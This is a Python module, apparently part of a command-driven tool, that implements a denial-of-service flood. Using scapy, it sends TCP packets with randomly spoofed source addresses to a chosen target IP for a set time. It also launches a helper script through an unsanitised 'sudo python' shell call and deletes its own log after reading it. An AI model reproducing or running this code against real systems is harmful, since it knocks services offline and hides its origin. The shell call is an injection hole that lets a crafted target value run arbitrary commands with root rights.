import random
import os
from scapy.all import *

from commands.command_base import CommandBase

# This encapsulates a simulation of a Denial of Service (DoS) attack on a target IP address 
# by repeatedly sending packets from random source IP addresses to a specific port of the target IP.
class Dos(CommandBase):
    # Initializes the Dos object with three instance variables: 
    # target_ip: the IP address of the target
    # source_port: the port number to send packets from
    # max_duration: the maximum duration for which the DoS attack should be run
    def __init__(self, target_ip, source_port, max_duration):
        self.target_ip = target_ip
        self.source_port = source_port
        self.max_duration = max_duration

    # Read from a file called dos_details.txt and returns the contents of the file as a string. 
    # The file is then deleted from the file system ensuring that there is no data being stored.
    def get_details(self):
        with open('dos_details.txt', 'r') as f:
            details = f.read()
        os.remove('dos_details.txt')
        return details
    
    # Runs the DoS attack by executing dos_util.py with the arguments target_ip, source_port, and max_duration.
    # This is to execute the attack within the system or else the only other way to execute would be through 
    # the command line as you need admin priveleges to send packets.
    def execute(self):
        os.system(f"sudo python dos_util.py {self.target_ip} {self.source_port} {self.max_duration}")
    
    # Sends packets from randomly generated source IP addresses to the target IP address and port number, 
    # and keeps track of the number of packets sent. The loop continues until the elapsed time since the start of the attack exceeds max_duration.
    def run(self):
        self._num_packets = 0

        self.start_time = time.time()
        while True:
            num1 = str(random.randint(1,254))
            num2 = str(random.randint(1,254))
            num3 = str(random.randint(1,254))
            num4 = str(random.randint(1,254)) 
            
            source_ip = f"{num1}.{num2}.{num3}.{num4}"
            ip = IP(src = source_ip, dst = self.target_ip)
            tcp = TCP(sport = self.source_port, dport = 1025)
            pkt = ip / tcp
            send(pkt)
            self._num_packets+=1

            if (time.time() - self.start_time) >= self.max_duration:
                break
        self.end_time = time.time()

    # Writes details of the attack (such as the target IP, start time, end time, duration, and number of packets sent) to a file called dos_details.txt
    # If the file already exists, an error is thrown
    def write_details(self):
        f = open("dos_details.txt", "x")
        f.write(f"Target IP: {self.target_ip}\nStart time: {time.ctime(self.start_time)}\nEnd time: {time.ctime(self.end_time)}\nDuration: {(self.end_time-self.start_time)}s\nNumber of packets sent: {self._num_packets}")
        f.close()

